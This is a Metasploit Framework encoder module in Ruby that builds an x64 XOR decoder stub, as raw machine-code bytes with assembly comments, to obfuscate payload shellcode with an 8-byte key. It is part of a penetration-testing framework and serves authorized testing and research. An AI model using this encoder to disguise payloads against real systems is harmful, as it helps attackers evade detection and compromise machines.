##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::Xor

  def initialize
    super(
      'Name'             => 'XOR Encoder',
      'Description'      => 'An x64 XOR encoder. Uses an 8 byte key and takes advantage of x64 relative addressing.',
      'Author'           => [ 'sf' ],
      'Arch'             => ARCH_X64,
      'License'          => MSF_LICENSE,
      'Decoder'          =>
        {
          'KeySize'      => 8,
          'KeyPack'      => 'Q',
          'BlockSize'    => 8,
        }
      )
  end
  # Indicate that this module can preserve some registers
  # ...which is currently not true. This is a temp fix
  # until the full preserve_registers functionality is
  # implemented.
  def can_preserve_registers?
    true
  end

  def decoder_stub( state )

    # calculate the (negative) block count . We should check this against state.badchars.
    block_count = [-( ( (state.buf.length - 1) / state.decoder_key_size) + 1)].pack( "V" )

    decoder =   "\x48\x31\xC9" +                 # xor rcx, rcx
          "\x48\x81\xE9" + block_count +   # sub ecx, block_count
          "\x48\x8D\x05\xEF\xFF\xFF\xFF" + # lea rax, [rel 0x0]
          "\x48\xBBXXXXXXXX" +             # mov rbx, 0x????????????????
          "\x48\x31\x58\x27" +             # xor [rax+0x27], rbx
          "\x48\x2D\xF8\xFF\xFF\xFF" +     # sub rax, -8
          "\xE2\xF4"                       # loop 0x1B

    state.decoder_key_offset = decoder.index( 'XXXXXXXX' )

    return decoder
  end
end
